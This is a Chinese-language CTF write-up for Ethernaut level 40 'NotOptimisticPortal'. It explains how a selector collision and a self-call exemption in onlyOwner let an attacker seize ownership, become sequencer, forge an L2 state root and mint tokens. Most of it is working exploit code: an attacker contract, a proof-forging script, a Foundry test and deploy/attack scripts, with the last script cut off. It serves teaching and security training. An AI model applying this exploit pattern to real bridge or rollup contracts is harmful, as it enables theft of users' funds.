# Ethernaut - 第40关：NotOptimisticPortal 解决方案 - HackMD

## 简介
本关卡难度较高，原因如下：

1.  需要极其细致地关注每一个细节。
2.  你需要编写并理解一个相对复杂的脚本，用于生成默克尔帕特里夏证明。

不过，攻击本身的原理其实很容易解释。在深入分析之前，我们需要先回顾几个关键概念：

### 函数选择器
计算机无法理解文字，只能识别字节。在Solidity中声明函数时，其签名会被哈希处理，哈希结果的前4个字节会成为调用数据（calldata）中使用的函数选择器。

4个字节（32位）虽然不足以唯一表示世界上的每一个函数名，但只要同一个合约中没有两个声明的函数编译后生成相同的选择器，就足以唯一标识一个合约中的函数。

## 必要背景知识

### 数据结构
要解决这个CTF（捕获旗帜）挑战，你必须理解以下数据结构：

-   [帕特里夏树（PATRICIA trie）](https://medium.com/@aatreyimehta1/patricia-trie-85c65d5d206c)：一种压缩的基数树，用于高效存储键值对。
-   [默克尔树（Merkle Tree）](https://www.youtube.com/watch?v=s7C2KjZ9n2U)：基于哈希的结构，用于实现存在性证明。
-   [默克尔帕特里夏树（Merkle Patricia trie）](https://www.youtube.com/watch?v=DGvRY9BjLRs)：以太坊结合了上述两种概念的混合结构。

### 递归长度前缀（RLP）序列化
这是一种紧凑的数据编码方式，用于以太坊的区块头数据序列化。

### 什么是Layer 2（L2）？
不同来源对其定义略有差异：

-   “Layer 2指的是任何构建在区块链（Layer 1）之上的链下网络、系统或技术，用于扩展其功能。”——[Chainlink](https://chain.link/education-hub/what-is-layer-2)
-   “Layer 2是一种扩容解决方案，能够实现高吞吐量，同时继承底层区块链的安全性。”——[CoinMarketCap](https://coinmarketcap.com/academy/glossary/layer-2)
-   “Layer 2是构建在以太坊之上的第二层网络，保留了以太坊的安全性和去中心化保证。”——[Uniswap](https://support.uniswap.org/hc/en-us/articles/7424975828749-What-is-a-Layer-2-Network)

这些定义都正确，但很少有文章清晰地解释L2在技术层面的本质以及它与L1的交互方式。以下是我给出的简单定义：

**L2是一种区块链，它会定期将一个哈希值（通常是默克尔根）发布到L1上。这个哈希值承诺了L2的状态。只要L2的状态与它在L1上发布的内容保持一致，它就继承了L1的安全性。如果它出现偏差，任何人都可以验证这种不一致，系统也就失去了信任。**

在本CTF中，L2的默克尔根被存储在`l2StateRoots`变量中。

#### L2中的排序器（Sequencer）
排序器负责确定交易的顺序，并通过提交承诺这些交易的默克尔根，将有效的区块发布到L1上。

#### L1与L2之间的通信
用户可以通过与特定的L1合约交互，触发从L1到L2的消息。同时，从L2到L1的通信通常由排序器处理。

大多数L2为用户提供了另一种途径：提交“强制交易”，排序器在满足特定条件（例如超时）后必须包含该交易。在本CTF中，`sendMessage`函数模拟了这种行为。

从L2到L1的消息则由`executeMessage`函数处理。

## 识别攻击面
有四个相关的角色/参与者：

-   **治理方（Governance）**：可以调用`governanceAction_____2357862414`函数，但它的地址是不可变的，因此试图修改它没有意义。
-   **所有者（Owner）**：可以调用`updateSequencer_____76439298743`和`transferOwnership_____610165642`函数。如果我们能成为所有者，也就能成为排序器。
-   **排序器（Sequencer）**：可以调用`submitNewBlock_____37278985983`函数。如果我们能控制排序器，就可以设置任意的区块。
-   **普通用户**：可以调用`executeMessage`和`sendMessage`函数。这两个函数将是我们的主要入口点（我们的攻击很可能通过调用这些函数触发）。

一个有趣的点是`onlyOwner`修饰符：

```solidity
    // 治理方必须能够转移门户的所有权
    modifier onlyOwner() {
        require(
            msg.sender == owner || 
            msg.sender == address(this), 
            "调用者不是所有者");
        _;
    }
```

其本意是允许通过`governanceAction_____2357862414`函数触发治理方的调用，但意外地允许合约自身调用自己，从而绕过所有权检查。

如果我们能让合约在`executeMessage`执行期间调用自身，就可以调用`transferOwnership_____610165642`函数成为所有者，然后调用`updateSequencer_____76439298743`函数（成为排序器），最后调用`submitNewBlock_____37278985983`函数覆盖任意L2状态根，从而实现未授权的提款操作。

现在我们必须问自己：
**有没有办法让合约调用自身？**

我们还需要记住自己的目标：铸造代币。那么……代码库中哪里有铸造（mint）的调用呢？

```solidity
    function executeMessage(
        address _tokenReceiver,
        uint256 _amount,
        address[] calldata _messageReceivers,
        bytes[] calldata _messageData,
        uint256 _salt,
        ProofData calldata _proofs,
        uint16 _bufferIndex
    ) external nonReentrant {

        // 思路：将排序器本应提交的信息压缩为一个哈希值
        bytes32 withdrawalHash = _computeMessageSlot(
            _tokenReceiver,
            _amount,
            _messageReceivers,
            _messageData,
            _salt
        );

        // 确保消息尚未被执行
        require(!executedMessages[withdrawalHash], "消息已被执行");
        require(_messageReceivers.length == _messageData.length, "消息执行数据数组不匹配");

        // 调用每个接收者
        for(uint256 i; i < _messageData.length; i++){
            // 审计点：会调用用户指定的任意接收者
            // 审计点：甚至会调用本合约
            _executeOperation(
                _messageReceivers[i], 
                _messageData[i], 
                false // 非治理操作
            );
        }

        _verifyMessageInclusion(
            withdrawalHash, // 审计点：输入参数的计算结果
            _proofs.stateTrieProof,
            _proofs.storageTrieProof,
            _proofs.accountStateRlp,
            _bufferIndex // 虽然由用户控制，但必须指向有效的L2状态根
        );


        // 审计点：将消息标记为已执行
        executedMessages[withdrawalHash] = true;

        // 审计点：我们需要触发这一逻辑
        if(_amount != 0){
            _mint(_tokenReceiver, _amount);
        }

        //...
    }
	
	function _executeOperation(
		address target,
		bytes calldata callData,
		bool isGovernanceAction
	) internal {
		if(!isGovernanceAction){
			// 确保执行的是目标地址上的onMessageReceived(bytes)入口点
			require(bytes4(callData[0:4]) == bytes4(0x3a69197e), "无效的消息入口点");
		}
		
		// 思路：只要入口点是onMessageReceived，或者是执行治理操作，就可以调用任意目标
		(bool success, ) = target.call(callData);
		require(success, "执行失败");
	}
```

只要满足以下条件，没有任何机制阻止合约通过`_executeOperation`调用自身：

1.  目标函数没有被`nonReentrant`修饰符保护，且
2.  我们要么是治理方（这是不可能的），**要么**合约中存在一个选择器为`0x3a69197e`的函数。

令人意外的是，实际情况恰好满足这些条件：

-   `onMessageReceived(bytes)`函数的选择器是`0x3a69197e`，尽管这个函数并不存在于合约中。
-   `transferOwnership_____610165642(address)`函数的选择器同样是`0x3a69197e`。

因此，我们可以通过`_executeOperation`调用这个函数，并夺取合约的所有权（`onlyOwner`修饰符不会回滚，因为`msg.sender == address(this)`）。

一旦获得所有权，我们还可以将自己提升为排序器，这使我们能够通过`submitNewBlock_____37278985983(bytes)`函数向合约提交任意的L2状态根。

在这里我先暂停一下，因为你可能会合理地问：

**我到底为什么要去检查某个函数选择器是否碰巧与正在进行的调用匹配？在实际审计中谁会这么做？？？**

这个问题完全合情合理。答案如下：
**你并不是真的在检查选择器冲突。**
**你是在思考：_有没有办法夺取这个合约的所有权？_**

这种思路会让你注意到，当调用来自`NotOptimisticPortal`合约自身时，**onlyOwner**修饰符可以被绕过。接着你会意识到，没有任何机制阻止你在`executeMessage`中指定合约自身作为调用目标。最后你会发现，只有当且仅当合约中存在一个选择器为`0x3a69197e`的函数时，这次攻击才有可能实施——而恰好，所有权转移函数的选择器就是这个值。

你也可以用另一种方式提出最初的问题，例如：

**有没有办法让合约自身调用`updateSequencer_____76439298743`，成为排序器，然后使用`submitNewBlock_____37278985983`写入任意的L2状态根？**

关键要点是：**在证明潜在漏洞确实无法触发之前，要对其保持警惕。**

现在我们可以提交任意的L2状态根了，那我们应该在其中写入什么内容呢？

## 寻找攻击方式

我们知道，铸造代币的唯一途径是通过`executeMessage`函数。同时我们还知道以下几点：

1.  函数的输入参数会被压缩成一个名为`withdrawalHash`的哈希值。
2.  由于`executedMessages[withdrawalHash]`的检查，`withdrawalHash`必须是从未被使用过的。
3.  由于`_messageReceivers.length == _messageData.length`的检查，每个接收者都必须有对应的调用数据。
4.  每次调用的目标函数选择器必须为`0x3a69197e`。这让我们能够夺取合约所有权，然后调用我们部署的、实现了`onMessageReceived(bytes)`函数的自定义合约，该合约会：
    1.  调用`updateSequencer_____76439298743`，并且
    2.  调用`submitNewBlock_____37278985983`，不过我们目前还不知道要包含的确切数据。
5.  我们必须附加有效的证明，以满足`_verifyMessageInclusion`函数内的检查。该函数执行两项重要的验证：
    1.  检查`{ key: L2_TARGET, value: accountStateRlp }`是否存在于排序器提交的默克尔帕特里夏树中。
    2.  检查`{ key: withdrawalHash, value: 0x01 }`是否存在于由`accountStateRlp.storageRoot`定义的存储树中。
6.  一旦这些检查通过，合约就会铸造请求数量的代币。

要攻击这个合约，我们需要计算出正确的`withdrawalHash`，以便生成有效的默克尔帕特里夏树根。它的值取决于以下因素：

1.  `_tokenReceiver`：接收代币的账户。我们称之为攻击者账户（ATTACKER）。
2.  `_amount`：要铸造的代币数量。
3.  `_messageReceivers`：在`executeMessage`期间被调用的合约：
    1.  `NotOptimisticPortal`：用于调用`transferOwnership_____610165642`，
    2.  `CallbackExploiter`：我们部署的合约，它将接收`NotOptimisticPortal`的所有权并实现`onMessageReceived`回调函数。在这个回调函数中，我们会：
        1.  调用`updateSequencer_____76439298743`成为排序器，并且
        2.  调用`submitNewBlock_____37278985983`写入攻击所需的伪造L2状态根。
4.  `_messageDatas`：
    1.  调用`transferOwnership_____610165642`的调用数据，
    2.  调用`onMessageReceived`的调用数据。
5.  `_salt`：我们简单地将其设为0。

由于`CallbackExploiter`尚未部署，所以这是第一步。部署完成后，我们可以为以下参数组合计算期望的`withdrawalHash`：`{_tokenReceiver: 攻击者账户, _amount: 1以太, _messageReceivers: [NotOptimisticPortal,CallbackExploiter],_messageDatas: [transferOwnership_____610165642的调用数据,onMessageReceived的调用数据], salt: 0}`

借助这些数据，我们可以使用`_computeMessageSlot`计算出提款槽位。同时我们必须记住，我们提交的L2状态根必须遵循以下约束：

1.  它必须引用`latestBlockHash`。
2.  它必须编码`latestBlockNumber + 1`。
3.  它的时间戳必须大于`latestBlockTimestamp`。

一旦这个L2状态根被提交，攻击就成功了。现在我们已经清楚了需要做什么，接下来就可以探讨具体的实现方法。

## 实施攻击

### `CallbackExploiter` 合约

我们要做的第一件事就是部署`CallbackExploiter`合约。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {INotOptimisticPortal} from "./INotOptimisticPortal.sol";
import {IMessageReceiver} from "./NotOptimisticPortal.sol";
import {NotOptimisticPortal} from "./NotOptimisticPortal.sol";
import {Ownable} from "openzeppelin-contracts-v5.4.0/access/Ownable.sol";
import {console} from "forge-std/console.sol";


contract CallbackExploiter is IMessageReceiver, Ownable {
    NotOptimisticPortal public portal;
    address public immutable ATTACKER; // 攻击者地址
    uint256 constant AMOUNT_TO_RECEIVE = 1 ether; // 要接收的代币数量
    uint256 bufferIndex; // 缓冲区索引
    bytes rlpBlockHeader; // RLP编码的区块头

    constructor(address _portal) Ownable(msg.sender) {
        portal = NotOptimisticPortal(_portal);
        ATTACKER = msg.sender;
    }

    struct ProofData {
        bytes stateTrieProof; // 状态树证明
        bytes storageTrieProof; // 存储树证明
        bytes accountStateRlp; // 账户状态的RLP编码
    }

    function exploit(NotOptimisticPortal.ProofData memory proofs) external {
        // 编码转移所有权的调用
        // 原理：与onMessageReceived拥有相同的函数选择器
        // 目标：获取合约所有权
        bytes memory transferOwnershipEncodedCall = abi.encodeCall(
            INotOptimisticPortal.transferOwnership_____610165642,
            (address(this))
        );

        // 触发自定义回调
        bytes memory onMessageReceivedEncodedCall = abi.encodeCall(
            CallbackExploiter.onMessageReceived,
            (bytes(""))
        );

        bytes[] memory receiversData = new bytes[](2);
        address[] memory receivers = new address[](2);
        
        receivers[0] = address(portal); // 第一个调用指向门户合约，利用CEI模式缺陷/弱所有权控制
        receivers[1] = address(this); // 第二个调用用于转移所有权

        receiversData[0] = transferOwnershipEncodedCall;
        receiversData[1] = onMessageReceivedEncodedCall;

        // 计算要绕过的存储槽位
        bytes32 storageSlotToByPass = computeMessageSlot(
            ATTACKER,
            AMOUNT_TO_RECEIVE,
            receivers,
            receiversData,
            0 // 盐值
        );

        console.log("存储槽位");
        console.logBytes32(storageSlotToByPass);

        // 调用门户合约的executeMessage函数
        portal.executeMessage(
            ATTACKER,
            AMOUNT_TO_RECEIVE,
            receivers,
            receiversData,
            0, // 盐值
            proofs,
            uint16(bufferIndex)
        );
    }

    function computeMessageSlot(
        address _tokenReceiver,
        uint256 _amount,
        address[] memory _messageReceivers,
        bytes[] memory _messageDatas,
        uint256 _salt
    ) public pure returns(bytes32) {
        bytes32 messageReceiversAccumulatedHash; // 接收者地址累加哈希
        bytes32 messageDatasAccumulatedHash; // 调用数据累加哈希

        if(_messageReceivers.length != 0) {
            for(uint i; i < _messageReceivers.length - 1; i++) {
                messageReceiversAccumulatedHash = keccak256(
                    abi.encode(
                        messageReceiversAccumulatedHash, 
                        _messageReceivers[i])
                    );
                messageDatasAccumulatedHash = keccak256(
                    abi.encode(
                        messageDatasAccumulatedHash, 
                        _messageDatas[i]
                        )
                    );
            }
        }

        // 存储消息处理信息的槽位？
        return keccak256(abi.encode(
            _tokenReceiver,
            _amount,
            messageReceiversAccumulatedHash,
            messageDatasAccumulatedHash,
            _salt // 仅通过盐值进行操纵
        ));
    }

    function onMessageReceived(bytes memory ) external override {
        // 执行核心攻击逻辑的回调函数
        // 此时该合约已是门户合约的所有者

        // 首先打印日志，确认已获取智能合约所有权
        address portalOwner = portal.owner();
        require(portalOwner == address(this), "攻击失败");

        // 将自己设置为排序器
        portal.updateSequencer_____76439298743(address(this));
        address portalSequencer = portal.sequencer();
        require(portalSequencer == address(this), "攻击失败");

        // 以排序器身份提交新的区块
        portal.submitNewBlock_____37278985983(
            rlpBlockHeader
        );
    }

    function setPortal(address _portal) external {
        portal = NotOptimisticPortal(_portal);
    }

    function setBufferIndex(uint256 _index) external onlyOwner {
        bufferIndex = _index;
    }

    function setRLPBlockHeader(bytes memory _rlpBlockHeader) external onlyOwner {
        rlpBlockHeader = _rlpBlockHeader;
    }
}
```

通过这个合约，我们可以借助`computeMessageSlot`函数计算出`withdrawalHash`，并将其值存储在环境变量`WITHDRAWAL_SLOT`中。而`latestBlockHash`、`latestBlockNumber`和`latestBlockTimestamp`这些参数可以直接从`NotOptimisticPortal`合约中查询获取。至此，我们就拥有了计算攻击所需的L2状态根的全部参数。

### 生成L2状态根与证明

通过一系列实战性的编码工作，我们编写了以下脚本，用于生成攻击所需的所有数据。

```javascript
import { Trie } from '@ethereumjs/trie';
import { RLP } from '@ethereumjs/rlp';
import { keccak256 } from 'ethereum-cryptography/keccak';
import { hexToBytes, bytesToHex, concatBytes } from 'ethereum-cryptography/utils';
import dotenv from 'dotenv';

dotenv.config();
// 常量定义
const L2_TARGET = '0x4242424242424242424242424242424242424242'; // L2目标地址
const POSTED_PARENT_HASH = process.env.POSTED_PARENT_HASH || '0xed20f024a9b5b75b1dd37fe6c96b829ed766d78103b3ab8f442f3b2ebbc557b9'; // 已发布的父区块哈希
const POSTED_BLOCK_NUMBER = process.env.POSTED_BLOCK_NUMBER ? parseInt(process.env.POSTED_BLOCK_NUMBER) : 60806040; // 已发布的区块号
const POSTED_BLOCK_TIMESTAMP = process.env.POSTED_BLOCK_TIMESTAMP ? parseInt(process.env.POSTED_BLOCK_TIMESTAMP) + 10 : 1606824023; // 已发布的区块时间戳
const NEW_MESSAGE_SLOT = process.env.WITHDRAWAL_SLOT; // 新的消息槽位（提款槽位）

// 辅助函数：将地址转换为字节数组
function addressToBytes(address: string): Uint8Array {
    return hexToBytes(address.toLowerCase().replace('0x', ''));
}

// 辅助函数：补齐字节数组至32字节（bytes32格式）
function padBytes32(value: Uint8Array): Uint8Array {
    const padded = new Uint8Array(32);
    padded.set(value, 32 - value.length);
    return padded;
}

// 计算存储键的哈希（与以太坊的keccak256(key)逻辑一致）
function computeStorageKey(slot: string): Uint8Array {
    const slotBytes = hexToBytes(slot.replace('0x', ''));
    return keccak256(padBytes32(slotBytes));
}

// 计算账户键的哈希（地址的keccak256哈希）
function computeAccountKey(address: string): Uint8Array {
    return keccak256(addressToBytes(address));
}

// RLP编码账户状态 [nonce, balance, storageRoot, codeHash]
function encodeAccountState(
    nonce: number,
    balance: bigint,
    storageRoot: Uint8Array,
    codeHash: Uint8Array
): Uint8Array {
    const encoded = RLP.encode([
        nonce === 0 ? new Uint8Array() : nonce,
        balance === 0n ? new Uint8Array() : `0x${balance.toString(16)}`,
        storageRoot,
        codeHash
    ]);
    return encoded;
}

// RLP编码区块头
function encodeBlockHeader(
    parentHash: string,
    ommersHash: string,
    beneficiary: string,
    stateRoot: Uint8Array,
    transactionsRoot: string,
    receiptsRoot: string,
    logsBloom: string,
    difficulty: number,
    number: number,
    gasLimit: number,
    gasUsed: number,
    timestamp: number,
    extraData: string,
    mixHash: string,
    nonce: string
): Uint8Array {
    const header = [
        hexToBytes(parentHash.replace('0x', '')),
        hexToBytes(ommersHash.replace('0x', '')),
        hexToBytes(beneficiary.replace('0x', '')),
        stateRoot,
        hexToBytes(transactionsRoot.replace('0x', '')),
        hexToBytes(receiptsRoot.replace('0x', '')),
        hexToBytes(logsBloom.replace('0x', '')),
        difficulty === 0 ? new Uint8Array() : difficulty,
        number,
        gasLimit,
        gasUsed,
        timestamp,
        hexToBytes(extraData.replace('0x', '')),
        hexToBytes(mixHash.replace('0x', '')),
        hexToBytes(nonce.replace('0x', ''))
    ];

    return RLP.encode(header);
}

async function generateProofs() {
    console.log('=== 生成默克尔证明 ===\n');

    // 步骤1：创建包含单个条目的存储树
    const storageTrie = new Trie();

    // 这是我们要证明存在的消息槽位
    const messageSlot = NEW_MESSAGE_SLOT;
    const storageKey = computeStorageKey(messageSlot as string);
    const storageValue = RLP.encode(1); // 值为0x01

    await storageTrie.put(storageKey, storageValue);
    const storageRoot = storageTrie.root();

    console.log('存储树根:', bytesToHex(storageRoot));
    console.log('消息槽位:', messageSlot);
    console.log('存储键（哈希后）:', bytesToHex(storageKey));

    // 生成存储证明
    const storageProof = await storageTrie.createProof(storageKey);
    const storageProofRlp = RLP.encode(storageProof);

    console.log('存储证明:', bytesToHex(storageProofRlp));
    console.log('存储证明长度:', storageProof.length, '个节点\n');

    // 步骤2：创建账户状态
    const emptyCodeHash = keccak256(new Uint8Array()); // 空代码的哈希
    const accountStateRlp = encodeAccountState(
        0,           // 随机数（nonce）
        0n,          // 余额
        storageRoot, // 来自存储树的存储根
        emptyCodeHash // 空代码的代码哈希
    );

    console.log('账户状态RLP编码:', bytesToHex(accountStateRlp));
    console.log('空代码哈希:', bytesToHex(emptyCodeHash), '\n');

    // 步骤3：创建包含该账户的状态树
    const stateTrie = new Trie();
    const accountKey = computeAccountKey(L2_TARGET);

    await stateTrie.put(accountKey, accountStateRlp);
    const stateRoot = stateTrie.root();

    console.log('状态树根:', bytesToHex(stateRoot));
    console.log('L2目标地址:', L2_TARGET);
    console.log('账户键（哈希后）:', bytesToHex(accountKey));

    // 生成状态证明
    const stateProof = await stateTrie.createProof(accountKey);
    const stateProofRlp = RLP.encode(stateProof);

    console.log('状态证明:', bytesToHex(stateProofRlp));
    console.log('状态证明长度:', stateProof.length, '个节点\n');

    // 步骤4：创建区块头
    const blockNumber = POSTED_BLOCK_NUMBER + 1; // 新区块号为已发布区块号+1
    const timestamp = POSTED_BLOCK_TIMESTAMP + 1; // 新区块时间戳为已发布时间戳+1
    const parentHash = POSTED_PARENT_HASH; // 父区块哈希

    const blockHeaderRlp = encodeBlockHeader(
        parentHash,
        '0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347', // 空叔块哈希
        '0x0000000000000000000000000000000000000000', // 受益地址
        stateRoot,
        '0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421', // 空交易根
        '0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421', // 空收据根
        '0x' + '0'.repeat(512), // 空日志布隆过滤器
        0, // 难度
        blockNumber,
        30000000, // 燃气限制
        0, // 燃气使用量
        timestamp,
        '0x', // 额外数据
        '0x0000000000000000000000000000000000000000000000000000000000000000', // 混合哈希
        '0x0000000000000000000000' // 随机数（8字节）
    );

    const blockHash = keccak256(blockHeaderRlp); // 计算区块哈希

    console.log('=== 区块头信息 ===');
    console.log('区块号:', blockNumber);
    console.log('时间戳:', timestamp);
    console.log('父区块哈希:', parentHash);
    console.log('区块头RLP编码:', bytesToHex(blockHeaderRlp));
    console.log('区块哈希:', bytesToHex(blockHash), '\n');

    // 步骤5：输出合约调用数据
    console.log('=== 合约调用参数 ===');
    console.log('messageSlot:', messageSlot);
    console.log('stateTrieProof:', bytesToHex(stateProofRlp));
    console.log('storageTrieProof:', bytesToHex(storageProofRlp));
    console.log('accountStateRlp:', bytesToHex(accountStateRlp));
    console.log('bufferIndex: 0（或当前缓冲区索引）');
    console.log('\n用于构造函数/submitNewBlock的区块头:', bytesToHex(blockHeaderRlp));

    // 验证信息
    console.log('\n=== 验证结果 ===');
    console.log('✓ 存储树包含目标消息槽位');
    console.log('✓ 账户状态包含存储根');
    console.log('✓ 状态树在L2_TARGET地址下包含该账户');
    console.log('✓ 区块头包含状态根');

    return {
        messageSlot,
        stateTrieProof: bytesToHex(stateProofRlp),
        storageTrieProof: bytesToHex(storageProofRlp),
        accountStateRlp: bytesToHex(accountStateRlp),
        blockHeaderRlp: bytesToHex(blockHeaderRlp),
        stateRoot: bytesToHex(stateRoot),
        storageRoot: bytesToHex(storageRoot),
        blockHash: bytesToHex(blockHash),
        blockNumber,
        timestamp
    };
}

// 运行生成器
generateProofs()
    .then(result => {
        console.log('\n=== 生成完成 ===');
        console.log('可在Solidity测试中使用这些值！');
    })
    .catch(err => {
        console.error('生成证明时出错:', err);
        process.exit(1);
    });
```

通过这个脚本，我们可以生成以下数据：

-   `stateTrieProof`（状态树证明）
-   `storageTrieProof`（存储树证明）
-   `accountStateRlp`（账户状态的RLP编码）
-   RLP编码的区块头

现在我们已经具备了实施攻击所需的全部内容——只需编写执行攻击的脚本即可。

### 编码实现的概念验证（POC）

#### 本地测试

我们首先需要初始区块的RLP编码区块头。随后，生成攻击过程中需要提交的证明和RLP编码区块头。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {NotOptimisticPortal} from "../src/not-optimistic-portal/NotOptimisticPortal.sol";
import {CallbackExploiter} from "../src/not-optimistic-portal/CallbackExploiter.sol";
import {Strings} from "openzeppelin-contracts-v5.4.0/utils/Strings.sol";

contract NotOptimisticPortalTest is Test {
	using Strings for *;
	NotOptimisticPortal portal; // 门户合约实例
	CallbackExploiter exploiterCallback; // 回调攻击合约实例
	address constant ATTACKER = vm.envAddress("RECEIVER_ACCOUNT"); // 攻击者账户（从环境变量获取）
	uint256 constant AMOUNT_TO_RECEIVE = 100 ether; // 要接收的代币数量
	address GOVERNANCE_TEST = makeAddr("governance"); // 测试用的治理账户
	
	// 证明数据结构
	struct ProofData {
		bytes stateTrieProof; // 状态树证明
		bytes storageTrieProof; // 存储树证明
		bytes accountStateRlp; // 账户状态的RLP编码
	}
	
	function setUp() public {
		// 读取空的RLP编码区块头（从环境变量获取）
		bytes memory encodedBytesRLP = vm.envBytes("EMPTY_RLP_BLOCK_HEADER");
		
		// 本地部署门户合约
		portal = new NotOptimisticPortal(
			"PortalToken",
			"PORTAL",
			encodedBytesRLP,
			GOVERNANCE_TEST
		);
		
		uint256 bufferCounterMinusOne = portal.bufferCounter() - 1;
		// console.log("首个区块哈希: %s",  abi.encodePacked(portal.latestBlockHash()));
		console.log("缓冲区计数器 %d", portal.bufferCounter());
		
		bytes32 encodedRoot = bytes32(abi.encodePacked(portal.l2StateRoots(bufferCounterMinusOne)));
		console.log("状态根[ %d ] : %s", bufferCounterMinusOne, Strings.toHexString(uint256(encodedRoot), 32));
		console.log("最新区块号: %d", portal.latestBlockNumber());
		console.log("首个区块时间戳: %d", portal.latestBlockTimestamp());
		
		// 部署回调攻击合约
		exploiterCallback = new CallbackExploiter(address(portal));
	}
	
	function testExploit() public {
		// 测试攻击逻辑
		address[] memory receivers = new address[](2);
		
		// 编码回调攻击合约的onMessageReceived函数调用
		bytes memory onMessageReceived = abi.encodeCall(
			CallbackExploiter.onMessageReceived,
			(bytes(""))
		);
		
		// 编码门户合约的转移所有权函数调用
		bytes memory transferOwnershipEncodedCall = abi.encodeCall(
			NotOptimisticPortal.transferOwnership_____610165642,
			(address(exploiterCallback))
		);
		
		bytes[] memory receiversData = new bytes[](2);
		receiversData[0] = transferOwnershipEncodedCall;
		receiversData[1] = onMessageReceived;
		receivers[0] = address(portal); // 第一个接收者为门户合约
		receivers[1] = address(exploiterCallback); // 第二个接收者为回调攻击合约
		
		// 计算消息槽位
		bytes32 slotComputed = _computeMessageSlot(
			ATTACKER,
			AMOUNT_TO_RECEIVE, // 1 wei（此处实际为100 ether）
			receivers,
			receiversData,
			0 // 盐值
		);
		
		console.log("提款槽位: ", Strings.toHexString(uint256(slotComputed), 32));
		// 读取攻击前槽位的值
		bytes32 slotValueBeforeAttack = vm.load(
			address(portal),
			slotComputed
		);
		
		NotOptimisticPortal.ProofData memory proofs;
		
		// 从环境变量加载证明数据
		proofs.stateTrieProof = vm.envBytes("STATE_TRIE_PROOF_TEST");
		proofs.storageTrieProof = vm.envBytes("STORAGE_TRIE_PROOF_TEST");
		proofs.accountStateRlp = vm.envBytes("ACCOUNT_STATE_RLP_TEST");
		// 从环境变量加载RLP编码的区块头
		bytes memory rlpBlockHeader = vm.envBytes("RLP_BLOCK_HEADER_TEST");
		
		// 设置回调攻击合约的RLP区块头
		exploiterCallback.setRLPBlockHeader(rlpBlockHeader);
		
		// 调用门户合约的executeMessage函数发起攻击
		portal.executeMessage(
			ATTACKER,
			AMOUNT_TO_RECEIVE,
			receivers,
			receiversData,
			0,
			proofs,
			1
		);
		
		// 验证攻击结果：攻击者账户拥有代币，且槽位被标记为已执行
		require(portal.balanceOf(ATTACKER) > 0, "攻击者仍未获得代币");
		require(portal.executedMessages(slotComputed), "槽位未被覆盖");
	}
	
	// 计算消息槽位（与目标合约逻辑一致）
	function _computeMessageSlot(
		address _tokenReceiver,
		uint256 _amount,
		address[] memory _messageReceivers,
		bytes[] memory _messageDatas,
		uint256 _salt
	) internal pure returns(bytes32) {
		bytes32 messageReceiversAccumulatedHash; // 接收者地址累加哈希
		bytes32 messageDatasAccumulatedHash; // 调用数据累加哈希
		
		if(_messageReceivers.length != 0) {
			for(uint i; i < _messageReceivers.length - 1; i++) {
				messageReceiversAccumulatedHash = keccak256(
					abi.encode(
						messageReceiversAccumulatedHash,
						_messageReceivers[i])
				);
				messageDatasAccumulatedHash = keccak256(
					abi.encode(
						messageDatasAccumulatedHash,
						_messageDatas[i]
					)
				);
			}
		}
		
		// 存储消息处理信息的槽位？
		return keccak256(abi.encode(
			_tokenReceiver,
			_amount,
			messageReceiversAccumulatedHash,
			messageDatasAccumulatedHash,
			_salt // 仅通过盐值进行操纵
		));
	}
}
```

#### 测试网脚本

首先，我们需要部署`CallbackExploiter`合约。以下是实现该操作的简单脚本：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {console2} from "forge-std/console2.sol";
import {CallbackExploiter} from "../../src/not-optimistic-portal/CallbackExploiter.sol";

/** 使用方法:
 *   forge script script/NotOptimisticPortal/DeployAttackerCallback.s.sol:DeployAttackerCallback --rpc-url $RPC_URL --broadcast --private-key $PRIVATE_KEY
 *
 * 本地测试使用:
 *   forge script script/NotOptimisticPortal/DeployAttackerCallback.s.sol:DeployAttackerCallback --fork-url $RPC_URL --private-key $PRIVATE_KEY
*/
contract DeployAttackerCallback is Script {
    CallbackExploiter public exploiterCallback; // 回调攻击合约实例

    function run() public {
        // 从环境变量获取部署者私钥
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        // 部署回调攻击合约
        exploiterCallback = new CallbackExploiter(vm.envAddress("NOT_OPTIMISTIC_PORTAL_ADDRESS"));

        vm.stopBroadcast();
        // 验证部署者与合约中ATTACKER地址一致
        require(exploiterCallback.ATTACKER() == vm.addr(deployerPrivateKey), "部署者与ATTACKER不匹配");

        console2.log("CallbackExploiter已部署至: %s", address(exploiterCallback));
    }
}
```

部署完成后，我们就可以获取提款槽位并执行攻击。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {console2} from "forge-std/console2.sol";
import {NotOptimisticPortal} from "../../src/not-optimistic-portal/NotOptimisticPortal.sol";
import {CallbackExploiter} from "../../src/not-optimistic-portal/CallbackExploiter.sol";

/** 使用方法:
 *   forge script script/NotOptimisticPortal/NotOptimisticPortal.s.sol:NotOptimisticPortalAttack --rpc-url $RPC_URL --broadcast --private-key $PRIVATE_KEY
 *
 * 本地测试使用:
 *   forge script script/NotOptimisticPortal/NotOptimisticPortal.s.sol:NotOptimisticPortalAttack --fork-url $RPC_URL --private-key $PRIVATE_KEY
*/
contract NotOptimisticPortalAttack is Script {
	NotOptimisticPortal public portal; // 门户合约实例
	CallbackExploiter public exploiterCallback; // 回调攻击合约实例
	uint256 AMOUNT_TO_RECEIVE = 1 ether; // 要接收的代币数量
	
	// 假设门户合约和攻击合约已完成部署
	function run() public {
		// 从环境变量获取攻击者私钥
		uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
		address attacker = vm.addr(attackerPrivateKey);
		// 从环境变量获取合约地址并实例化
		portal = NotOptimisticPortal(vm.envAddress("NOT_OPTIMISTIC_PORTAL_ADDRESS"));
		exploiterCallback = CallbackExploiter(vm.envAddress("CALLBACK_CONTRACT_ADDRESS"));
		
		// 为地址添加标签，方便调试
		vm.label(address(portal), "NotOptimisticPortal");
		vm.label(address(exploiterCallback), "CallbackExploiter");
		vm.label(attacker, "Attacker");
		
